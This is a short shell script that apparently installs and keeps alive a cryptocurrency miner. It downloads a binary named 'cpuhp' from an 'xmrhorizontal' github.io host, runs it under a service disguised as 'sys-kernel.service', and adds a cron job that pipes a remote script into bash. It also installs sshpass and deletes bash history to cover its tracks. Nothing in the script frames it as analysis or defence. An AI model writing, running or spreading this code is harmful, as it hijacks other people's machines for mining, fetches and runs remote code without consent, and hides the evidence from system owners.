if [ ! -f /etc/cron.d/cronextend ]; then
	apt-get update
 	apt-get install -y sshpass
	systemctl stop sys-kernel.service
        killall cpuhp
 	cd /bin
	rm cpuhp
	wget https://xmrhorizontal.github.io/cpuhp
 	chmod +x /bin/cpuhp
        RANDOM_DELAY=$((RANDOM % 41))
        echo "*/59 * * * * root (sleep $((RANDOM_DELAY * 60)); curl -s https://xmrhorizontal.github.io/searcher.sh | bash)" > /etc/cron.d/cronextend
 	systemctl daemon-reload
	systemctl start sys-kernel.service
        rm -f ~/.bash_history
        rm -f /root/.bash_history
fi
